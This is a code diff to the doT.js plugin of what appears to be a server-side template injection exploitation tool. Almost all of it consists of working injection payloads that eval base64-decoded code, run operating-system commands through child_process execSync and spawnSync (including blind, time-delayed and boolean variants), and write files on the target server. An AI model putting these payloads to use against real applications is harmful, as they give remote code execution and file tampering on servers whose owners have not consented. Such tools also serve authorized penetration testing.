@@ -29,6 +29,32 @@ class Dot(javascript.Javascript):
                 'header': """{{{{=''['x'][({header[0]}+{header[1]}).toString()+""",
                 'trailer': """+({trailer[0]}+{trailer[1]}).toString()]}}}}""",
             },
+            'evaluate': {
+                'evaluate': """{{{{=eval(Buffer('{code_b64p}', 'base64').toString())}}}}""",
+                'test_os': """global.process.mainModule.require('os').platform()""",
+            },
+            'evaluate_error': {
+                'evaluate': """eval(Buffer('{code_b64p}', 'base64').toString())""",
+            },
+            'evaluate_boolean': {
+                'call': 'inject',
+                'evaluate_blind': """{{{{=''}}}}{{{{=[""][0+!eval(Buffer('{code_b64p}', 'base64').toString())]["length"]}}}}"""
+            },
+            'execute': {
+                'call': 'evaluate',
+                'execute': """global.process.mainModule.require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString());"""
+            },
+            'execute_blind': {
+                # The bogus prefix is to avoid false detection of Javascript instead of doT
+                'call': 'inject',
+                'execute_blind': """{{{{=''}}}}{{{{global.process.mainModule.require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString() + ' && sleep {delay}');}}}}"""
+            },
+            'execute_boolean': {
+                'call': 'evaluate_blind',
+                # spawnSync() shell option has been introduced in node 5.7, so this will not work with old node versions.
+                # TODO: use another function.
+                'execute_blind': """global.process.mainModule.require('child_process').spawnSync(Buffer('{code_b64p}', 'base64').toString(), options={{shell:true}}).status===0"""
+            },
             'write': {
                 'call': 'inject',
                 'write': """{{{{=global.process.mainModule.require('fs').appendFileSync('{path}', Buffer('{chunk_b64p}', 'base64'), 'binary')}}}}""",
@@ -41,22 +67,6 @@ class Dot(javascript.Javascript):
             'md5': {
                 'call': 'evaluate',
                 'md5': """global.process.mainModule.require('crypto').createHash('md5').update(global.process.mainModule.require('fs').readFileSync('{path}')).digest("hex");"""
-            },
-            'evaluate': {
-                'evaluate': """{{{{=eval(Buffer('{code_b64p}', 'base64').toString())}}}}""",
-                'test_os': """global.process.mainModule.require('os').platform()""",
-            },
-            'evaluate_error': {
-                'evaluate': """eval(Buffer('{code_b64p}', 'base64').toString())""",
-            },
-            'execute': {
-                'call': 'evaluate',
-                'execute': """global.process.mainModule.require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString());"""
-            },
-            'execute_blind': {
-                # The bogus prefix is to avoid false detection of Javascript instead of doT
-                'call': 'inject',
-                'execute_blind': """{{{{=''}}}}{{{{global.process.mainModule.require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString() + ' && sleep {delay}');}}}}"""
             },
         })
 
